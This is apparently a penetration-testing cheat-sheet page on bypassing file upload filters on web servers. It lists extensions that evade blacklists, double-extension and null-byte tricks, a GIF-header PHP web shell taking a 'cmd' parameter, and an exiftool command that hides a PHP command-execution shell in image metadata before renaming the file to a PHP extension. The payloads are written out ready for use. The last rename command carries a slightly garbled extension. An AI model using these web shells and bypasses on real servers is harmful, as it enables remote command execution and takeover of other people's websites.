---
description: Use these methods to attempt to bypass file upload restrictions in web servers
---

# File Upload

## Blacklist Bypass

Blacklisting is a type of protection where certain strings of data are prohibited from being accepted. In this case, file extensions, will be denied from being accepted to the web server.&#x20;

* These are very easy to bypass
* You can do this by a variety of methods

### Examples

Here are some alternatives to popular extensions that can be used to get around blacklist filters:

```
php.txt, .sh, .pht, .phtml, .phP, .Php, .php7, .php%00.jpeg, .cgi
```

Another extension for web shells are JSP -- this file is a server-generated web page. It is similar to a .ASP or .php file, but it contains Java code instead of Active X or PHP.

```
.MF, .jspx, .jspf, .jsw, .jsv, .xml, .war, .jsp, .aspx
```

## Whitelist Bypass

The other method for bypass is using whitelists. The whitelist is composed of things that the server will ONLY accept.&#x20;

* This may sound like it is more secure, however, there are still ways to get around this

### Examples

<mark style="color:yellow;">False extension bypass</mark>

By using a reverse shell, with a photo extension, an attacker can fool a web app into accepting a php file that also has a JPG/PNG extension:

```
reverse-shell.php.jpg
```

<mark style="color:yellow;">Null character bypass</mark>

We can bypass whitelist filters to make characters get ignored when the file is saved. This will inject a forbidden extension and an allowed extension in which can lead to a bypass:

```
payload.php%00.jpg OR payload.php\x00.jpg
```

<mark style="color:yellow;">GIF bypass</mark>

```
GIF89a; <?php system($_GET['cmd']); ?>
```

## Exif Data Bypass

This method will utilize metadata in an image (using the exiftool), such as the location, name, camera being used, and much more.

* You can modify malicious data to your payload or image using <mark style="color:yellow;">exiftool</mark>

By inserting a short command shell as information into your photo, it could appear something like this:&#x20;

{% code overflow="wrap" %}
```
exiftool -DocumentName="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" pwtoken.jpeg
```
{% endcode %}

* You can then use exiftool to check for the new data in the photo (i.e. exiftool pwtoken.jpeg)

```
$ exiftool pwtoken.jpeg
```

Then, add a shell extension to make it an executable file once in the web app server:

```
$ mv catphoto.jpg catphoto.php\x00.jpghe
```









